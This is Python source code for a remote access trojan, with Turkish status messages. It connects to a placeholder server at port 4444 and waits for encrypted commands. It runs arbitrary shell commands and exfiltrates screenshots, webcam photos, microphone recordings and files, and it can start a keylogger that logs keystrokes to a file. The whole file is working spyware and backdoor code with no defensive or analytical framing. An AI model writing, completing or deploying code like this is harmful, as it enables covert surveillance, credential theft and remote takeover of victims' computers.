import socket
import subprocess
import os
import pyautogui
import base64
import threading
import tempfile
from crypto_utils import encrypt, decrypt
import sounddevice as sd
import soundfile as sf
import cv2

SERVER_IP = 'SUNUCU_IP'
SERVER_PORT = 4444

def run_keylogger():
    from pynput import keyboard

    def on_press(key):
        with open("keys.log", "a") as log:
            log.write(f"{key}\n")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def record_mic(duration=5, filename="mic.wav"):
    fs = 44100
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    sf.write(filename, recording, fs)

def take_picture():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        filename = "webcam.jpg"
        cv2.imwrite(filename, frame)
    cam.release()

def handle_command(sock):
    while True:
        try:
            enc_command = sock.recv(8192).decode()
            command = decrypt(enc_command)

            if command.startswith("cd "):
                os.chdir(command[3:])
                result = f"Yeni dizin: {os.getcwd()}"

            elif command == "screenshot":
                image = pyautogui.screenshot()
                image.save("ss.png")
                with open("ss.png", "rb") as f:
                    result = "[screenshot]" + base64.b64encode(f.read()).decode()
                os.remove("ss.png")

            elif command == "webcam":
                take_picture()
                with open("webcam.jpg", "rb") as f:
                    result = "[webcam]" + base64.b64encode(f.read()).decode()
                os.remove("webcam.jpg")

            elif command.startswith("upload "):
                filename = command.split(" ", 1)[1]
                data = sock.recv(100000)
                with open(filename, "wb") as f:
                    f.write(base64.b64decode(data))
                result = f"{filename} yüklendi."

            elif command.startswith("download "):
                filename = command.split(" ", 1)[1]
                if os.path.exists(filename):
                    with open(filename, "rb") as f:
                        data = base64.b64encode(f.read()).decode()
                    sock.send(encrypt("[file]" + data).encode())
                    continue
                else:
                    result = "Dosya bulunamadı."

            elif command == "mic":
                record_mic()
                with open("mic.wav", "rb") as f:
                    result = "[audio]" + base64.b64encode(f.read()).decode()
                os.remove("mic.wav")

            elif command == "keylogger":
                threading.Thread(target=run_keylogger, daemon=True).start()
                result = "Keylogger başlatıldı."

            else:
                result = subprocess.getoutput(command)

            sock.send(encrypt(result).encode())

        except Exception as e:
            sock.send(encrypt(f"Hata: {str(e)}").encode())
            break

def connect():
    sock = socket.socket()
    sock.connect((SERVER_IP, SERVER_PORT))
    handle_command(sock)
    sock.close()

connect()